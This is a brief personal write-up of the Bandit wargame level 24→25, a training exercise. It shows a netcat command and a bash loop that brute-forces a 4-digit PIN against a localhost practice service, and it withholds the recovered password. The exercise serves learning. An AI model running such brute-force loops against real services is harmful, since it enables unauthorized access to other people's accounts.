# Bandit Level 24 → Level 25

## What I did
Connected to a service running on localhost and brute-forced the PIN.

## Commands I used
nc localhost 30002
for i in {0000..9999}; do echo "password $i"; done | nc localhost 30002

## Result
Found the password for Level 25 (not shared here).

## What I learned
- How netcat works
- How brute-force attacks function
- How loops can automate attacks
